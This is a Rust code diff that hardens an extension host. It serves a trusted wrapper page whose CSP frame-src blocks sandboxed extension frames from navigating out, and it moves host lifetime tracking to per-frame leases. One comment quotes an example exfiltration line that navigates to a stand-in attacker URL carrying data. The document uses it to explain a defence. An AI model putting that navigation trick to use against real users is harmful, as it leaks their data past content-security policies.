@@ -49,6 +49,9 @@ use super::package_path::check_package_relative_path;
 /// Path prefix every extension asset is served under.
 pub(crate) const EXTENSION_ROUTE_PREFIX: &str = "ext";
 
+/// Path prefix of the trusted wrapper document that hosts an extension.
+pub(crate) const FRAME_ROUTE_PREFIX: &str = "frame";
+
 /// Why a request did not resolve to a servable file.
 #[derive(Debug, Clone, Copy, PartialEq, Eq)]
 pub(crate) enum AssetError {
@@ -174,6 +177,78 @@ fn content_security_policy(origin: &str) -> String {
     )
 }
 
+/// The `Content-Security-Policy` served with the trusted wrapper document.
+///
+/// `frame-src` is the **navigation wall**, and it is the reason the wrapper
+/// exists at all. `connect-src 'none'` on the extension document stops fetch,
+/// WebSocket and EventSource — it does **not** stop `location.href = "https://
+/// attacker/?d=" + data`, because navigation is not a fetch directive. A
+/// `sandbox="allow-scripts"` frame cannot navigate its parent, but it can
+/// navigate *itself*, and the request carrying the data leaves before the frame
+/// does. That was observed, not theorised: on WebKitGTK and in the browser
+/// harness, against the exact header this host used to serve.
+///
+/// A nested browsing context's navigation is checked against the **container
+/// document's** `frame-src`. So the extension runs one level in, inside a
+/// document we serve, and any attempt to navigate itself anywhere but back to
+/// this origin is refused before a request is made.
+///
+/// The wrapper is trusted (we author its bytes), so it may run its own script —
+/// but it is granted nothing else: no network, no images, no styles.
+fn wrapper_content_security_policy(origin: &str) -> String {
+    format!(
+        "default-src 'none'; \
+         frame-src {origin}; \
+         script-src 'unsafe-inline'; \
+         connect-src 'none'; \
+         base-uri 'none'; \
+         form-action 'none'"
+    )
+}
+
+/// The trusted wrapper document that hosts one extension frame.
+///
+/// Two jobs, and deliberately nothing else:
+///
+/// 1. **Be the navigation container** whose `frame-src` bounds the extension.
+/// 2. **Relay the BRIDGE_SPEC §2 handshake.** The wrapper adds a hop between
+///    the extension and Buzz, so the extension's `parent` is this document
+///    rather than the app. This forwards `{buzz:…}` messages up, and forwards
+///    messages *down* with their transferred ports intact, so P4's
+///    `MessageChannel` still reaches the extension. Buzz's source-identity
+///    check therefore matches this wrapper's window — which is the frame Buzz
+///    itself created — and the wrapper embeds exactly one extension, so the
+///    attribution stays one-to-one.
+///
+/// This relays; it does not interpret. No bridge, no `window.buzz`, no method
+/// dispatch — those are P4.
+fn wrapper_document(entry_url: &str) -> String {
+    format!(
+        r#"<!doctype html>
+<meta charset="utf-8">
+<title>extension frame</title>
+<style>html,body{{margin:0;height:100%}}iframe{{display:block;border:0;width:100%;height:100%}}</style>
+<iframe id="ext" sandbox="allow-scripts" src="{entry_url}"></iframe>
+<script>
+(function () {{
+  var frame = document.getElementById("ext");
+  // Extension -> Buzz. Only messages from the one frame we embed.
+  window.addEventListener("message", function (event) {{
+    if (event.source === frame.contentWindow) {{
+      parent.postMessage(event.data, "*", event.ports);
+      return;
+    }}
+    // Buzz -> extension, ports carried through so a MessageChannel survives.
+    if (event.source === parent) {{
+      frame.contentWindow.postMessage(event.data, "*", event.ports);
+    }}
+  }});
+}})();
+</script>
+"#
+    )
+}
+
 #[derive(Clone)]
 struct HostState {
     base_dir: PathBuf,
@@ -186,6 +261,7 @@ fn build_router(base_dir: PathBuf, port: u16) -> Router {
         origin: origin_for_port(port),
     };
     Router::new()
+        .route(&format!("/{FRAME_ROUTE_PREFIX}/{{id}}"), get(serve_wrapper))
         .route(
             &format!("/{EXTENSION_ROUTE_PREFIX}/{{id}}/{{*asset}}"),
             get(serve_asset),
@@ -202,6 +278,15 @@ fn build_router(base_dir: PathBuf, port: u16) -> Router {
 /// caveat).
 pub(crate) fn origin_for_port(port: u16) -> String {
     format!("http://127.0.0.1:{port}")
+}
+
+/// The URL Buzz points its iframe at: the trusted wrapper, not the extension.
+///
+/// Buzz must never frame the extension document directly — doing so removes the
+/// container whose `frame-src` is the navigation wall, which is exactly the
+/// arrangement that leaked.
+pub(crate) fn wrapper_url(origin: &str, id: &str) -> String {
+    format!("{origin}/{FRAME_ROUTE_PREFIX}/{id}")
 }
 
 /// The URL of an installed extension's entry document.
@@ -231,6 +316,31 @@ pub(crate) fn frame_url(origin: &str, id: &str, entry: &str) -> String {
         "{origin}/{EXTENSION_ROUTE_PREFIX}/{id}/{}",
         encoded.join("/")
     )
+}
+
+async fn serve_wrapper(
+    State(state): State<HostState>,
+    RoutePath(id): RoutePath<String>,
+) -> Response {
+    // The wrapper names the entry from the *installed manifest*, so a caller
+    // cannot ask this document to embed an arbitrary path.
+    let manifest = match super::resolve_frame_manifest(&state.base_dir, &id) {
+        Ok(manifest) => manifest,
+        Err(_) => return empty(StatusCode::NOT_FOUND),
+    };
+    let entry_url = frame_url(&state.origin, &manifest.id, &manifest.entry);
+
+    let mut response = Response::new(Body::from(wrapper_document(&entry_url)));
+    let headers = response.headers_mut();
+    insert(headers, header::CONTENT_TYPE, "text/html; charset=utf-8");
+    insert(
+        headers,
+        header::CONTENT_SECURITY_POLICY,
+        &wrapper_content_security_policy(&state.origin),
+    );
+    insert(headers, header::X_CONTENT_TYPE_OPTIONS, "nosniff");
+    insert(headers, header::CACHE_CONTROL, "no-store");
+    response
 }
 
 async fn serve_asset(
@@ -281,8 +391,15 @@ struct RunningHost {
 #[derive(Default)]
 struct FrameHostState {
     running: Option<RunningHost>,
-    /// Live frames that have acquired the host and not yet released it.
-    holders: usize,
+    /// Leases handed to live frames and not yet released.
+    ///
+    /// A set of opaque ids rather than a count, because a count cannot tell
+    /// "release the holder you took" from "release *a* holder". A frame whose
+    /// open failed never received a lease, so its cleanup cannot decrement
+    /// somebody else's — which is exactly the defect a bare counter had: one
+    /// healthy frame plus one failed-open frame unmounting stopped the server
+    /// still serving the healthy one.
+    leases: std::collections::BTreeSet<String>,
 }
 
 static FRAME_HOST: OnceLock<Mutex<FrameHostState>> = OnceLock::new();
@@ -298,16 +415,25 @@ fn host_state() -> MutexGuard<'static, FrameHostState> {
     }
 }
 
-/// Start the host if it is not running and register one more live frame.
+/// A live frame's claim on the host. Opaque to the caller by design.
+#[derive(Debug, Clone, PartialEq, Eq)]
+pub(crate) struct FrameLease {
+    pub port: u16,
+    pub lease: String,
+}
+
+/// Start the host if it is not running and issue a lease to one live frame.
 ///
-/// Returns the port. Idempotent: a second frame reuses the running listener.
-pub(crate) async fn acquire(base_dir: PathBuf) -> Result<u16, String> {
+/// Idempotent in the sense that matters: a second frame reuses the running
+/// listener, but gets its **own** lease.
+pub(crate) async fn acquire(base_dir: PathBuf) -> Result<FrameLease, String> {
+    let lease = uuid::Uuid::new_v4().to_string();
     {
         let mut state = host_state();
         if let Some(running) = &state.running {
             let port = running.port;
-            state.holders += 1;
-            return Ok(port);
+            state.leases.insert(lease.clone());
+            return Ok(FrameLease { port, lease });
         }
     }
 
@@ -338,19 +464,25 @@ pub(crate) async fn acquire(base_dir: PathBuf) -> Result<u16, String> {
         // retire the listener we just created rather than leaking it.
         let port = running.port;
         let _ = shutdown.send(());
-        state.holders += 1;
-        return Ok(port);
+        state.leases.insert(lease.clone());
+        return Ok(FrameLease { port, lease });
     }
     state.running = Some(RunningHost { port, shutdown });
-    state.holders += 1;
-    Ok(port)
+    state.leases.insert(lease.clone());
+    Ok(FrameLease { port, lease })
 }
 
-/// Drop one live frame, stopping the host when the last one goes.
-pub(crate) fn release() {
+/// Release one lease, stopping the host when the last one goes.
+///
+/// Idempotent and unforgeable-ish: releasing a lease that was never issued, or
+/// releasing the same one twice, does nothing. A frame that failed to open has
+/// no lease to present, so its cleanup is a no-op instead of a theft.
+pub(crate) fn release(lease: &str) {
     let mut state = host_state();
-    state.holders = state.holders.saturating_sub(1);
-    if state.holders == 0 {
+    if !state.leases.remove(lease) {
+        return;
+    }
+    if state.leases.is_empty() {
         if let Some(running) = state.running.take() {
             let _ = running.shutdown.send(());
         }
@@ -363,7 +495,7 @@ pub(crate) fn release() {
 /// a reload — must not leave a listener behind the process.
 pub(crate) fn shutdown_now() {
     let mut state = host_state();
-    state.holders = 0;
+    state.leases.clear();
     if let Some(running) = state.running.take() {
         let _ = running.shutdown.send(());
     }
